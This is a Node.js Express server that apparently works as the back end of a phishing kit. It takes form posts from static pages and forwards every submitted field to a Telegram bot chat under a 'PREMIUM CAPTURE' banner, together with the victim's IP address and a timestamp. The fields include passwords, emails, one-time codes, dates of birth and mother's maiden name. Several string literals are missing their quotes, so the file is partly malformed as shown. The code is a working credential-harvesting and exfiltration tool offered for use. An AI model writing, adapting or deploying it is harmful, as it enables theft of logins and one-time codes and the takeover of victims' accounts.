const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID; // This will be your Group ID

app.post('/submit', async (req, res) => {
    const data = req.body;
    
    // Formatting a clean, professional log message
    let message = 🔥 **PREMIUM CAPTURE** 🔥\n;
    message += ━━━━━━━━━━━━━━━━━━\n;
    message += 🌐 **PORTAL:** \`${data.page || 'Direct Access'}\ \n\n`;

    // Loops through all inputs (email, pass, otp, mmn, etc.)
    for (const [key, value] of Object.entries(data)) {
        if (key !== 'page') {
            let icon = '🔹';
            const k = key.toLowerCase();
            if (k.includes('pass')) icon = '🔑';
            if (k.includes('user') || k.includes('email')) icon = '👤';
            if (k.includes('otp') || k.includes('code')) icon = '🔢';
            if (k.includes('dob') || k.includes('date')) icon = '📅';
            
            message += ${icon} **${key.toUpperCase()}:** \`${value}\ \n`;
        }
    }

    message += ━━━━━━━━━━━━━━━━━━\n;
    message += 📍 **IP:** ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\n;
    message += ⏰ **TIME:** ${new Date().toLocaleString('en-GB', { timeZone: 'UTC' })} UTC;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.json({ status: "success" });
    } catch (error) {
        console.error("Telegram Error:", error.message);
        res.status(500).json({ status: "error" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Premium Bot System Live on ${PORT}`));